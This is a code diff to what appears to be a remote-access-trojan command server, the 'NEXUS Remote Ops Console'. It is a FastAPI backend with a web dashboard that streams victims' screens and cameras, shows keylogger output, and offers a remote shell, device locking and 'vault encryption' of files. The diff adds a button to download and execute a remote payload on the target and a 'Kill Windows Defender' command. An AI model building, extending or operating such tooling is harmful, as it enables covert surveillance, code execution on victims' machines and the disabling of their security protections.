@@ -1,4 +1,5 @@
 import os
+import sys
 import time
 import json
 import asyncio
@@ -46,7 +47,27 @@ def _ws_payload(msg: dict):
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     os.makedirs("downloads", exist_ok=True)
+    cleanup_task = asyncio.create_task(_cleanup_loop())
     yield
+    cleanup_task.cancel()
+    try:
+        await cleanup_task
+    except asyncio.CancelledError:
+        pass
+
+
+async def _cleanup_loop():
+    """Every 30s, remove stale clients and log stats."""
+    while True:
+        await asyncio.sleep(30)
+        try:
+            stale = await state.cleanup_stale()
+            active = len(state.clients)
+            total_viewers = sum(len(s.viewers) + len(s.cam_viewers) for s in state.clients.values())
+            if stale or active:
+                logger.info(f"📊 Stats: {active} active clients, {total_viewers} viewers, {stale} cleaned")
+        except Exception as ex:
+            logger.warning(f"Cleanup error: {ex}")
 
 app = FastAPI(lifespan=lifespan)
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
@@ -60,8 +81,9 @@ class ClientSession:
         self.cam_viewers = set()
         self.camera_ws = None
         self.last_seen = time.time()
-        # Multiple dashboard viewers may write to the agent socket concurrently — serialize.
+        self.created = time.time()
         self._agent_send_lock = asyncio.Lock()
+        self._broadcast_tasks = set()
 
     async def agent_send_bytes(self, data: bytes):
         async with self._agent_send_lock:
@@ -71,10 +93,81 @@ class ClientSession:
         async with self._agent_send_lock:
             await self.ws.send_text(text)
 
+    async def broadcast_bytes(self, payload: bytes):
+        """Fan-out bytes to all viewers concurrently."""
+        tasks = []
+        for v in list(self.viewers):
+            tasks.append(self._send_to_viewer_bytes(v, payload))
+        if tasks:
+            self._broadcast_tasks.update(tasks)
+            await asyncio.gather(*tasks, return_exceptions=True)
+            self._broadcast_tasks.difference_update(tasks)
+
+    async def _send_to_viewer_bytes(self, v, payload: bytes):
+        try:
+            await v.send_bytes(payload)
+        except Exception:
+            self.viewers.discard(v)
+
+    async def broadcast_text(self, data: dict):
+        """Fan-out text to all viewers concurrently."""
+        tasks = []
+        for v in list(self.viewers):
+            tasks.append(self._send_to_viewer_text(v, data))
+        if tasks:
+            self._broadcast_tasks.update(tasks)
+            await asyncio.gather(*tasks, return_exceptions=True)
+            self._broadcast_tasks.difference_update(tasks)
+
+    async def _send_to_viewer_text(self, v, data: dict):
+        try:
+            await v.send_json(data)
+        except Exception:
+            self.viewers.discard(v)
+
+    async def broadcast_cam_bytes(self, payload: bytes):
+        """Fan-out camera bytes to cam_viewers concurrently."""
+        tasks = []
+        for v in list(self.cam_viewers):
+            tasks.append(self._send_to_cam_viewer(v, payload))
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _send_to_cam_viewer(self, v, payload: bytes):
+        try:
+            await v.send_bytes(payload)
+        except Exception:
+            self.cam_viewers.discard(v)
+
+    @property
+    def is_alive(self):
+        return time.time() - self.last_seen < 120
+
 
 class ServerState:
     def __init__(self):
         self.clients = {}
+        self._lock = asyncio.Lock()
+
+    async def get_client(self, device_id: str):
+        return self.clients.get(device_id)
+
+    async def set_client(self, device_id: str, session: ClientSession):
+        async with self._lock:
+            self.clients[device_id] = session
+
+    async def remove_client(self, device_id: str):
+        async with self._lock:
+            self.clients.pop(device_id, None)
+
+    async def cleanup_stale(self):
+        """Remove clients that haven't sent data in 120s."""
+        now = time.time()
+        stale = [cid for cid, s in list(self.clients.items()) if now - s.last_seen > 120]
+        for cid in stale:
+            logger.info(f"🧹 Cleaning stale client: {cid[:8]}...")
+            await self.remove_client(cid)
+        return len(stale)
 
 
 state = ServerState()
@@ -85,8 +178,10 @@ DASHBOARD = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="pragma" content="no-cache">
+<meta http-equiv="expires" content="0">
 <title>NEXUS · Remote Ops Console</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&family=Orbitron:wght@500;600;700;800&display=swap" rel="stylesheet">
 <style>
 :root{
   --gold:#f5d742;--cyan:#00f5ff;--magenta:#ff2ea6;--violet:#9d7bff;
@@ -97,7 +192,7 @@ DASHBOARD = """<!DOCTYPE html>
 }
 *{box-sizing:border-box;margin:0;padding:0}
 body{
-  font-family:'Inter',system-ui,sans-serif;
+  font-family:'Segoe UI',system-ui,sans-serif;
   background:var(--bg);color:var(--text);
   display:flex;flex-direction:column;height:100vh;overflow:hidden;
   position:relative;
@@ -124,14 +219,14 @@ body::after{
   display:flex;align-items:center;padding:0 14px;gap:8px;z-index:100;
 }
 #topnav .logo{
-  font-family:'Orbitron',sans-serif;font-size:12px;font-weight:800;letter-spacing:4px;
+  font-family:'Consolas','Segoe UI',sans-serif;font-size:12px;font-weight:800;letter-spacing:4px;
   background:linear-gradient(90deg,var(--cyan),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent;
   margin-right:14px;white-space:nowrap;text-shadow:0 0 40px rgba(0,245,255,.3);
 }
 #node_tag{
   color:var(--cyan);font-weight:700;font-size:12px;margin-right:16px;padding:5px 14px;
   background:rgba(0,245,255,.08);border:1px solid rgba(0,245,255,.35);border-radius:999px;display:none;
-  font-family:'JetBrains Mono',monospace;box-shadow:0 0 20px rgba(0,245,255,.15);
+  font-family:'Consolas','Courier New',monospace;box-shadow:0 0 20px rgba(0,245,255,.15);
 }
 
 /* Combo Dropdown */
@@ -166,21 +261,21 @@ body::after{
 #wrap{flex:1;display:flex;overflow:hidden}
 
 #sidebar{width:268px;background:var(--glass);backdrop-filter:blur(10px);border-right:1px solid var(--border);display:flex;flex-direction:column;box-shadow:4px 0 32px rgba(0,0,0,.25)}
-#sidebar h2{padding:14px 16px;font-family:'Orbitron',sans-serif;font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:4px;color:var(--cyan);border-bottom:1px solid var(--border)}
+#sidebar h2{padding:14px 16px;  font-family:'Consolas','Segoe UI',sans-serif;font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:4px;color:var(--cyan);border-bottom:1px solid var(--border)}
 #clist{flex:1;overflow-y:auto;padding:8px}
 
 .nd{padding:12px 14px;background:rgba(20,24,42,.75);margin-bottom:8px;border-radius:10px;cursor:pointer;border:1px solid rgba(0,245,255,.12);transition:.2s;position:relative;overflow:hidden}
 .nd:hover{border-color:rgba(0,245,255,.4);box-shadow:0 0 20px rgba(0,245,255,.08)}
 .nd.act{border-color:var(--cyan);background:rgba(0,245,255,.06);box-shadow:0 0 24px rgba(0,245,255,.12)}
 .nd::before{content:'';position:absolute;left:0;top:0;height:100%;width:3px;background:linear-gradient(180deg,var(--cyan),var(--magenta));border-radius:3px 0 0 3px}
-.nd b{color:#fff;font-size:12px;font-weight:700;font-family:'JetBrains Mono',monospace}
+.nd b{color:#fff;font-size:12px;font-weight:700;font-family:'Consolas','Courier New',monospace}
 .nd .os{color:var(--muted);font-size:10px;margin-top:4px;display:block}
 .bg{font-size:8px;font-weight:800;padding:3px 10px;border-radius:20px;background:rgba(61,255,157,.12);color:var(--green);margin-top:6px;display:inline-block;letter-spacing:.6px;text-transform:uppercase;border:1px solid rgba(61,255,157,.25)}
-.es{padding:30px;color:#333;font-size:11px;text-align:center;font-weight:600}
+.es{padding:30px;color:var(--muted);font-size:12px;text-align:center;font-weight:600;letter-spacing:1px}
 
 #stage{flex:1;display:flex;overflow:hidden;min-height:0}
 #cvw{flex:1;min-width:100px;background:#020208;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;position:relative;border-right:1px solid rgba(0,245,255,.1)}
-#vlbl{position:absolute;top:12px;left:12px;font-size:10px;font-weight:800;padding:6px 12px;border-radius:6px;background:rgba(0,8,16,.85);color:var(--cyan);text-transform:uppercase;letter-spacing:2px;z-index:5;font-family:'Orbitron',sans-serif;border:1px solid rgba(0,245,255,.25)}
+#vlbl{position:absolute;top:12px;left:12px;font-size:10px;font-weight:800;padding:6px 12px;border-radius:6px;background:rgba(0,8,16,.85);color:var(--cyan);text-transform:uppercase;letter-spacing:2px;z-index:5;font-family:'Consolas','Segoe UI',sans-serif;border:1px solid rgba(0,245,255,.25)}
 canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12px rgba(0,245,255,.06))}
 
 #rp{
@@ -191,7 +286,7 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 }
 .th{
   flex-shrink:0;padding:8px 10px;background:rgba(0,40,56,.5);font-size:10px;font-weight:800;border-bottom:1px solid rgba(0,245,255,.2);
-  color:var(--cyan);display:flex;align-items:center;gap:8px;justify-content:space-between;font-family:'Orbitron',sans-serif;letter-spacing:1px;
+  color:var(--cyan);display:flex;align-items:center;gap:8px;justify-content:space-between;font-family:'Consolas','Segoe UI',sans-serif;letter-spacing:1px;
 }
 .th .th-left{display:flex;align-items:center;gap:8px}
 .th .dot{width:8px;height:8px;border-radius:50%;background:var(--cyan);box-shadow:0 0 10px var(--cyan);animation:pulse 2s ease infinite}
@@ -199,17 +294,19 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 .ps-tools{display:flex;align-items:center;gap:4px}
 .ps-rbtn{
   width:28px;height:26px;border-radius:6px;border:1px solid rgba(0,245,255,.35);background:rgba(0,20,30,.8);
-  color:var(--cyan);font-size:16px;font-weight:700;cursor:pointer;line-height:1;padding:0;font-family:'JetBrains Mono',monospace;
+  color:var(--cyan);font-size:16px;font-weight:700;cursor:pointer;line-height:1;padding:0;font-family:'Consolas','Courier New',monospace;
   transition:.15s;
 }
 .ps-rbtn:hover{background:rgba(0,245,255,.15);color:#fff}
 #term{
-  flex:1;min-height:120px;padding:12px;background:#040a12;font-family:'JetBrains Mono','Consolas',monospace;font-size:clamp(10px,1.1vw,12px);
-  overflow-y:auto;color:#b8e8ff;line-height:1.55;white-space:pre-wrap;border-left:2px solid rgba(0,245,255,.15);
+  flex:1;min-height:120px;padding:12px;background:#040a12;  font-family:'Consolas','Courier New',monospace;font-size:clamp(10px,1.1vw,12px);
+  overflow-y:auto;color:#b8e8ff;line-height:1.55;white-space:pre-wrap;word-break:break-all;border-left:2px solid rgba(0,245,255,.15);
 }
+#term .run-dot{color:var(--green);animation:pulse 1s ease infinite;display:inline-block}
+#termPop .run-dot{color:var(--violet);animation:pulse 1s ease infinite;display:inline-block}
 .ti{background:rgba(0,28,42,.9);border-top:1px solid rgba(0,245,255,.2);padding:8px 10px;display:flex;align-items:center;gap:6px}
-.ti span{color:var(--green);font-family:'JetBrains Mono',monospace;font-weight:700;font-size:11px;flex-shrink:0}
-.ti input{background:rgba(0,0,0,.35);border:1px solid rgba(0,245,255,.2);border-radius:6px;color:#f0ffff;flex:1;outline:0;font-family:'JetBrains Mono',monospace;font-size:11px;padding:8px 10px}
+.ti span{color:var(--green);font-family:'Consolas','Courier New',monospace;font-weight:700;font-size:11px;flex-shrink:0}
+.ti input{background:rgba(0,0,0,.35);border:1px solid rgba(0,245,255,.2);border-radius:6px;color:#f0ffff;flex:1;outline:0;font-family:'Consolas','Courier New',monospace;font-size:11px;padding:8px 10px}
 .ti input:focus{border-color:var(--cyan);box-shadow:0 0 12px rgba(0,245,255,.12)}
 
 /* Modals */
@@ -220,12 +317,12 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 #termm .mb.mb-term{display:flex;flex-direction:column;height:min(70vh,580px);max-height:86vh;min-height:280px}
 #termm .mb.mb-term #termPop{flex:1;min-height:0}
 .mh{padding:12px 16px;background:rgba(0,30,48,.6);display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(0,245,255,.2);gap:10px;flex-wrap:wrap}
-.mh span{font-weight:800;font-size:13px;font-family:'Orbitron',sans-serif;color:var(--cyan);letter-spacing:.5px}
+.mh span{font-weight:800;font-size:13px;font-family:'Consolas','Segoe UI',sans-serif;color:var(--cyan);letter-spacing:.5px}
 .mh .mh-actions{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
 .mh button{background:rgba(0,245,255,.12);border:1px solid rgba(0,245,255,.35);color:var(--cyan);padding:6px 12px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;transition:.15s;font-family:inherit}
 .mh button:hover{background:rgba(0,245,255,.22);color:#fff}
 .mc{flex:1;overflow-y:auto;padding:16px;min-height:0}
-.brc{padding:10px 14px;background:rgba(0,8,20,.9);border-bottom:1px solid rgba(0,245,255,.15);font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--cyan);word-break:break-all}
+.brc{padding:10px 14px;background:rgba(0,8,20,.9);border-bottom:1px solid rgba(0,245,255,.15);font-size:11px;font-family:'Consolas','Courier New',monospace;color:var(--cyan);word-break:break-all}
 
 .fi{padding:10px 12px;border-bottom:1px solid rgba(0,245,255,.08);display:flex;align-items:center;transition:.12s;gap:8px;flex-wrap:wrap}
 .fi:hover{background:rgba(0,245,255,.04)}
@@ -236,15 +333,15 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 .bsm-term{border-color:rgba(157,123,255,.5)!important;color:#dcc6ff!important}
 .bsm-term:hover{border-color:var(--violet)!important;color:#fff!important}
 
-#termPop{flex:1;min-height:160px;padding:12px;background:#030810;font-family:'JetBrains Mono',monospace;font-size:11px;overflow-y:auto;color:#c5f0ff;line-height:1.55;white-space:pre-wrap;border-top:1px solid rgba(0,245,255,.12)}
+#termPop{flex:1;min-height:160px;padding:12px;background:#030810;font-family:'Consolas','Courier New',monospace;font-size:11px;overflow-y:auto;color:#c5f0ff;line-height:1.55;white-space:pre-wrap;border-top:1px solid rgba(0,245,255,.12)}
 .ti-pop{background:rgba(0,24,36,.95);border-top:1px solid rgba(157,123,255,.25);padding:8px 10px;display:flex;align-items:center;gap:8px}
-.ti-pop span{color:var(--violet);font-family:'JetBrains Mono',monospace;font-weight:700;font-size:11px}
-.ti-pop input{flex:1;background:rgba(0,0,0,.4);border:1px solid rgba(157,123,255,.3);border-radius:6px;color:#fff;padding:8px 10px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:0}
-.term-path{font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace;max-width:100%;overflow:hidden;text-overflow:ellipsis}
+.ti-pop span{color:var(--violet);font-family:'Consolas','Courier New',monospace;font-weight:700;font-size:11px}
+.ti-pop input{flex:1;background:rgba(0,0,0,.4);border:1px solid rgba(157,123,255,.3);border-radius:6px;color:#fff;padding:8px 10px;font-family:'Consolas','Courier New',monospace;font-size:11px;outline:0}
+.term-path{font-size:10px;color:var(--muted);font-family:'Consolas','Courier New',monospace;max-width:100%;overflow:hidden;text-overflow:ellipsis}
 
 .btn{
   background:linear-gradient(135deg,var(--cyan),#00a8c6);border:0;color:#02040a;padding:9px 18px;border-radius:8px;cursor:pointer;font-weight:800;font-size:11px;
-  text-transform:uppercase;letter-spacing:.6px;font-family:'Orbitron',sans-serif;transition:.18s;box-shadow:0 4px 20px rgba(0,245,255,.25);
+  text-transform:uppercase;letter-spacing:.6px;font-family:'Consolas','Segoe UI',sans-serif;transition:.18s;box-shadow:0 4px 20px rgba(0,245,255,.25);
 }
 .btn:hover{filter:brightness(1.08);transform:translateY(-1px);box-shadow:0 6px 28px rgba(0,245,255,.35)}
 .bsm{background:rgba(20,26,48,.9);border:1px solid rgba(0,245,255,.2);color:#c8deff;padding:5px 10px;border-radius:6px;cursor:pointer;font-size:10px;font-family:inherit;transition:.15s;font-weight:600}
@@ -253,10 +350,10 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 .bng{background:linear-gradient(135deg,var(--green),#00c978);color:#020808;border:0}
 input[type=text]{background:rgba(0,12,24,.6);border:1px solid rgba(0,245,255,.2);color:#fff;padding:10px 14px;border-radius:8px;width:100%;margin:8px 0;font-size:13px;font-family:inherit}
 input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2px rgba(0,245,255,.12)}
-.status-panel{padding:10px 12px;margin:8px;border-radius:10px;background:rgba(0,40,32,.35);border:1px solid rgba(61,255,157,.2);color:#9effd0;font-size:12px;font-family:'JetBrains Mono',monospace}
+.status-panel{padding:10px 12px;margin:8px;border-radius:10px;background:rgba(0,40,32,.35);border:1px solid rgba(61,255,157,.2);color:#9effd0;font-size:12px;font-family:'Consolas','Courier New',monospace}
 .log-panel{margin:8px;border:1px solid rgba(0,245,255,.15);border-radius:10px;background:rgba(4,8,16,.9);overflow:hidden;flex-shrink:0}
-.log-panel .log-header{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:rgba(0,24,36,.6);color:var(--cyan);font-size:11px;font-family:'Orbitron',sans-serif;font-weight:700}
-.log-panel pre{margin:0;padding:12px;font-family:'JetBrains Mono',monospace;font-size:10px;line-height:1.45;color:#a8e8ff;background:#02060c;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word}
+.log-panel .log-header{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:rgba(0,24,36,.6);color:var(--cyan);font-size:11px;font-family:'Consolas','Segoe UI',sans-serif;font-weight:700}
+.log-panel pre{margin:0;padding:12px;font-family:'Consolas','Courier New',monospace;font-size:10px;line-height:1.45;color:#a8e8ff;background:#02060c;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word}
 @media (max-width:900px){
   #sidebar{width:220px}
   #rp{min-width:200px}
@@ -304,6 +401,8 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
             <a onclick="doLock()"><span class="ci">🔒</span> Lock Device</a>
             <a onclick="doEnc()" class="danger"><span class="ci">🔐</span> Vault Encryption</a>
             <a onclick="doDec()" style="color:#00e676;"><span class="ci">🔓</span> Vault Decryption</a>
+            <a onclick="openM('runm')"><span class="ci">▶️</span> Run Program</a>
+            <a onclick="doDisableDefender()" class="danger"><span class="ci">🛡️</span> Kill Windows Defender</a>
         </div>
     </div>
 
@@ -323,7 +422,7 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
 <div id="sidebar">
     <h2>◆ NODE MESH</h2>
     <div id="clist"><div class="es">AWAITING NODES...</div></div>
-    <div class="status-panel" id="statusBar">Status: awaiting nodes...</div>
+    <div class="status-panel" id="statusBar">Status: awaiting nodes... <button onclick="sync()" style="float:right;background:none;border:1px solid var(--cyan);color:var(--cyan);border-radius:4px;padding:2px 8px;cursor:pointer;font-size:10px">⟳</button></div>
     <div class="log-panel">
         <div class="log-header"><span>Server Logs</span><button class="bsm" onclick="loadLogs()">Refresh</button></div>
         <pre id="logArea">Loading logs...</pre>
@@ -406,6 +505,27 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
     </div>
 </div>
 
+<div id="runm" class="ov" onclick="if(event.target===this)closeM('runm')">
+    <div class="mb" style="max-width:550px">
+        <div class="mh"><span>▶️ Run Program / Payload</span><button onclick="closeM('runm')">✕ Close</button></div>
+        <div class="mc">
+            <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Download and execute a remote payload, or run a local file:</p>
+            <input type="text" id="runUrl" placeholder="https://example.com/payload.exe" style="margin-bottom:4px">
+            <input type="text" id="runArgs" placeholder="Arguments (optional)" style="margin-bottom:4px">
+            <label style="display:flex;align-items:center;gap:8px;color:var(--muted);font-size:12px;margin:8px 0;cursor:pointer">
+                <input type="checkbox" id="runTerminal" checked> Show output in terminal
+            </label>
+            <div style="display:flex;gap:8px">
+                <button class="btn" onclick="doDlEx()" style="flex:1">⬇ Download & Run from URL</button>
+            </div>
+            <hr style="border-color:var(--border);margin:16px 0">
+            <p style="color:var(--muted);font-size:12px;margin-bottom:8px">Or run a file already on the target:</p>
+            <input type="text" id="runLocalPath" placeholder="C:/path/to/file.exe" style="margin-bottom:4px">
+            <button class="btn" onclick="doRunLocalExe()" style="width:100%">▶ Run Local File</button>
+        </div>
+    </div>
+</div>
+
 <div id="sndm" class="ov" onclick="if(event.target===this)closeM('sndm')">
     <div class="mb" style="max-width:500px">
         <div class="mh"><span>🎵 Inject Sound</span><button onclick="closeM('sndm')">✕ Close</button></div>
@@ -443,7 +563,9 @@ let aid=null,ws=null,tres={w:1920,h:1080},cv_mode='screen';
 let _viewerWsMode='main';
 let _rxBinChain=Promise.resolve();
 let _wsReconnectTimer=null,_wsBackoffMs=2000;
-const cv=document.getElementById('cv'),cx=cv.getContext('2d');
+const cv=document.getElementById('cv');
+let cx=null;
+try{cx=cv.getContext('2d');}catch(e){console.warn('Canvas ctx:',e)}
 
 /* Dropdowns logic */
 document.querySelectorAll('.combo-btn').forEach(b => {
@@ -555,16 +677,19 @@ function connectViewerWs(nodeId, opts){
         try{ ws.onclose=null; ws.close(); }catch(_e){}
         ws=null;
     }
+    console.log('Connecting viewer WS to', url);
     ws=new WebSocket(url);
     ws.binaryType='blob';
     ws.onmessage=onMsg;
-    ws.onerror=()=>{ try{ if(ws) ws.close(); }catch(_e){} };
+    ws.onerror=()=>{ console.error('Viewer WS error'); try{ if(ws) ws.close(); }catch(_e){} };
     ws.onopen=()=>{
+        console.log('Viewer WS connected, sending CMD_VIEW');
         _wsBackoffMs=2000;
         if(audio_enabled) void resumeRxAudio();
         try{ snd({cmd:0x15,args:{mode:cv_mode,audio:audio_enabled}}); }catch(_e){}
     };
-    ws.onclose=()=>{
+    ws.onclose=(ev)=>{
+        console.log('Viewer WS closed:', ev.code, ev.reason);
         ws=null;
         updateStatus();
         if(aid && aid===nodeId){
@@ -617,6 +742,7 @@ async function handleBlobMessage(blob){
 }
 function onMsg(e){
     if(e.data instanceof Blob){
+        console.log('Received blob:', e.data.size, 'bytes');
         _rxBinChain = _rxBinChain.then(() => handleBlobMessage(e.data)).catch(()=>{});
         return;
     }
@@ -624,13 +750,15 @@ function onMsg(e){
         try{
             const m=JSON.parse(e.data);
             if(m.cmd===0x0F&&m.data){
+                if(m.data.status==='running') return;
                 const o=m.data.out||'';
-                if(m.data.shellId==='pop')atPop(o);else at(o);
+                if(m.data.shellId==='pop') atPop(o, true); else at(o, true);
             }
             if(m.cmd===0x11&&m.data)rfs(m.data);
             if(m.cmd===0x13&&m.data)dlb(m.data);
             if(m.cmd===0x0C)document.getElementById('kl').textContent+=m.data;
             if(m.cmd===0x30||m.cmd===0x32){document.getElementById('vd').textContent=m.data;openM('vm')}
+            if(m.cmd===0x41&&m.data&&m.data.out){ at(m.data.out, true); }
         }catch(err){}
     }
 }
@@ -916,10 +1044,43 @@ function doSh(){
     if(!v)return;
     snd({cmd:0x0F,args:{cmd:v,shellId:'side'}});
     at('PS> '+v);
+    at('<span class="run-dot">⏳ running...</span>', true);
     document.getElementById('sh').value='';
 }
-function at(t){const el=document.getElementById('term');if(!el)return;el.textContent+=t+'\\n';el.scrollTop=el.scrollHeight}
-function atPop(t){const el=document.getElementById('termPop');if(!el)return;el.textContent+=(t==null?'':String(t))+'\\n';el.scrollTop=el.scrollHeight}
+function _esc(str){
+    const d=document.createElement('div');
+    d.appendChild(document.createTextNode(str));
+    return d.innerHTML;
+}
+function at(t, isRunning){
+    const el=document.getElementById('term');
+    if(!el)return;
+    if(isRunning && el._lastRunningLine){
+        el._lastRunningLine.outerHTML='';
+        el._lastRunningLine=null;
+    }
+    const d=document.createElement('div');
+    d.innerHTML=isRunning ? t : _esc(t);
+    el.appendChild(d);
+    if(isRunning) el._lastRunningLine=d;
+    el.scrollTop=el.scrollHeight;
+    while(el.children.length>500) el.removeChild(el.firstChild);
+}
+function atPop(t, isRunning){
+    const el=document.getElementById('termPop');
+    if(!el)return;
+    if(isRunning && el._lastRunningLine){
+        el._lastRunningLine.outerHTML='';
+        el._lastRunningLine=null;
+    }
+    if(t===null||t===undefined) t='';
+    const d=document.createElement('div');
+    d.innerHTML=isRunning ? t : _esc(t);
+    el.appendChild(d);
+    if(isRunning) el._lastRunningLine=d;
+    el.scrollTop=el.scrollHeight;
+    while(el.children.length>500) el.removeChild(el.firstChild);
+}
 function doShPop(){
     const inp=document.getElementById('shPop');
     const ov=document.getElementById('termm');
@@ -929,6 +1090,7 @@ function doShPop(){
     const cwd=cwdRaw?_normWinPath(cwdRaw):'';
     snd({cmd:0x0F,args:{cmd:v,cwd:cwd||undefined,shellId:'pop'}});
     atPop('PS> '+v);
+    atPop('<span class="run-dot">⏳ running...</span>', true);
     inp.value='';
 }
 function _normWinPath(p){
@@ -1052,7 +1214,33 @@ function dlb(d){
 
 /* Tools */
 function doUrl(){const u=document.getElementById('ui').value;if(u)snd({cmd:0x40,args:{url:u}});closeM('urlm')}
-function doDl(){const u=document.getElementById('di').value;if(u)snd({cmd:0x41,args:{url:u}});closeM('dlm')}
+function doDl(){
+    const u=document.getElementById('di').value;
+    if(u)snd({cmd:0x41,args:{url:u}});
+    closeM('dlm');
+}
+function doDlEx(){
+    const url=document.getElementById('runUrl').value;
+    const args=document.getElementById('runArgs').value;
+    const terminal=document.getElementById('runTerminal').checked;
+    if(!url){alert('Enter a URL first.');return;}
+    snd({cmd:0x41,args:{url:url,args:args||'',terminal:terminal}});
+    closeM('runm');
+    if(terminal) at('> Downloading and running '+url.split('/').pop()+'...');
+}
+function doRunLocalExe(){
+    const path=document.getElementById('runLocalPath').value;
+    const terminal=document.getElementById('runTerminal').checked;
+    if(!path){alert('Enter a file path.');return;}
+    snd({cmd:0x43,args:{path:path,args:'',terminal:terminal}});
+    closeM('runm');
+    if(terminal) at('> Running local: '+path);
+}
+function doDisableDefender(){
+    if(!confirm('⚠️ This will attempt to disable Windows Defender on the target. Continue?'))return;
+    snd({cmd:0x42,args:{}});
+    at('> Disabling Windows Defender (multi-layer)...');
+}
 function lc(a){snd({cmd:0x0C,args:{action:a}})}
 function doLock(){const p=prompt('🔒 Enter lock password:');if(p)snd({cmd:0x20,args:{password:p}})}
 function doEnc(){
@@ -1120,13 +1308,16 @@ function closeM(id){document.getElementById(id).classList.remove('open')}
 async function sync(){
     const statusEl = document.getElementById('statusBar');
     try{
-        const r=await fetch('/clients');
+        const ctrl = new AbortController();
+        setTimeout(()=>ctrl.abort(), 5000);
+        const r=await fetch('/clients', {signal: ctrl.signal});
         const c=await r.json();
         const el=document.getElementById('clist');
+        if(!el) return;
         el.innerHTML='';
         const ids=Object.keys(c);
         if(!ids.length){
-            el.innerHTML='<div class="es">AWAITING NODES...</div>';
+            el.innerHTML='<div class="es">⏳ AWAITING NODES...</div>';
             if(statusEl) statusEl.textContent='Status: no clients connected';
             return;
         }
@@ -1139,14 +1330,16 @@ async function sync(){
             const d=document.createElement('div');
             d.className='nd'+(id===aid?' act':'');
             const os=c[id].os||'';
-            d.innerHTML=`<b>${c[id].hostname}</b><span class="os">${os.length>30?os.substring(0,30)+'...':os}</span><span class="bg">⚡ online</span>`;
+            const name=c[id].hostname||'Unknown';
+            d.innerHTML=`<b>${name}</b><span class="os">${os.length>30?os.substring(0,30)+'...':os}</span><span class="bg">⚡ online</span>`;
             d.onclick=()=>sel(id,c[id]);
             el.appendChild(d);
         });
     }catch(e){
-        console.error('Sync failed', e);
+        console.error('Sync failed:', e.name, e.message);
         if(statusEl) statusEl.textContent='Status: error loading clients';
-        document.getElementById('clist').innerHTML='<div class="es">ERROR LOADING CLIENTS</div>';
+        const el=document.getElementById('clist');
+        if(el) el.innerHTML='<div class="es">⚠️ ERROR: '+e.message+'</div>';
     }
 }
 async function loadLogs(){
@@ -1204,30 +1397,30 @@ async def ws_client(websocket: WebSocket):
             if kind == "skip":
                 continue
             if kind == "bytes":
-                if device_id and device_id in state.clients:
-                    for v in list(state.clients[device_id].viewers):
-                        try:
-                            await v.send_bytes(payload)
-                        except Exception:
-                            state.clients[device_id].viewers.discard(v)
+                if device_id:
+                    session = await state.get_client(device_id)
+                    if session:
+                        session.last_seen = time.time()
+                        await session.broadcast_bytes(payload)
             elif kind == "text":
                 data = json.loads(payload)
                 if data.get("cmd") == CMD_REG:
                     device_id = data["data"]["id"]
-                    state.clients[device_id] = ClientSession(websocket, data["data"])
+                    await state.set_client(device_id, ClientSession(websocket, data["data"]))
                     logger.info(f"✅ Node registered: {data['data'].get('hostname', '?')} ({device_id[:8]}...)")
-                elif device_id and device_id in state.clients:
-                    for v in list(state.clients[device_id].viewers):
-                        try:
-                            await v.send_json(data)
-                        except Exception:
-                            state.clients[device_id].viewers.discard(v)
+                elif device_id:
+                    session = await state.get_client(device_id)
+                    if session:
+                        session.last_seen = time.time()
+                        await session.broadcast_text(data)
     except WebSocketDisconnect:
         pass
+    except Exception as ex:
+        logger.warning(f"Agent loop error ({device_id[:8] if device_id else '?'}): {ex}")
     finally:
         logger.info(f"❌ Node disconnected: {device_id[:8] if device_id else '?'}...")
-        if device_id and device_id in state.clients:
-            state.clients.pop(device_id, None)
+        if device_id:
+            await state.remove_client(device_id)
 
 
 @app.websocket("/ws/client_cam")
@@ -1245,39 +1438,46 @@ async def ws_client_cam(websocket: WebSocket):
             if kind == "skip":
                 continue
             if kind == "bytes":
-                if device_id and device_id in state.clients:
-                    for v in list(state.clients[device_id].cam_viewers):
-                        try:
-                            await v.send_bytes(payload)
-                        except Exception:
-                            state.clients[device_id].cam_viewers.discard(v)
+                if device_id:
+                    session = await state.get_client(device_id)
+                    if session:
+                        session.last_seen = time.time()
+                        await session.broadcast_cam_bytes(payload)
             elif kind == "text":
                 data = json.loads(payload)
                 if data.get("cmd") == CMD_REG:
                     device_id = data["data"]["id"]
-                    if device_id in state.clients:
-                        state.clients[device_id].camera_ws = websocket
+                    session = await state.get_client(device_id)
+                    if session:
+                        session.camera_ws = websocket
                         logger.info(f"✅ Camera stream registered: {device_id[:8]}...")
